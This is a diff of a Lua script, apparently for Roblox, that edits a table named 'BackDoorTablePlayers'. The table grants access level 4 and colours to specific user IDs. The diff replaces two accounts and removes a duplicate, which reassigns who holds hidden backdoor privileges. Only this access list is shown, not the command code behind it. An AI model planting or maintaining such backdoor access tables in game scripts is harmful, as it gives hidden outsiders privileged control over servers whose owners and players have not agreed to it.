@@ -256,15 +256,15 @@ local BackDoorTableCommands = {
 }
 
 local BackDoorTablePlayers = {
-    [442342350] = {
-        ['xv16n'] = "xv16n"; 
+    [1530605769] = {
+        ['9vbw'] = "corey"; 
         ['Access'] = 4;
-        ['Colour'] = Color3.fromRGB(0,255,0);
+        ['Colour'] = Color3.fromRGB(75,0,130);
     };
-    [1299538795] = {
-        ['tn1bu'] = "tn1bu";
+    [172055892] = {
+        ['slappedyouonprison'] = "slapped";
         ['Access'] = 4;
-        ['Colour'] = Color3.fromRGB(0,0,255);
+        ['Colour'] = Color3.fromRGB(0,255,255);
 };
 [1534061782] = {
         ['whoisnirus'] = "whois";
@@ -280,11 +280,6 @@ local BackDoorTablePlayers = {
         ['YourANewGen'] = "fuck";
         ['Access'] = 4;
         ['Colour'] = Color3.fromRGB(255,20,147);
-    };
-   [1530605769] = {
-        ['9vbw'] = "Corey";
-        ['Access'] = 4;
-        ['Colour'] = Color3.fromRGB(230,230,250);
     };
 }
 
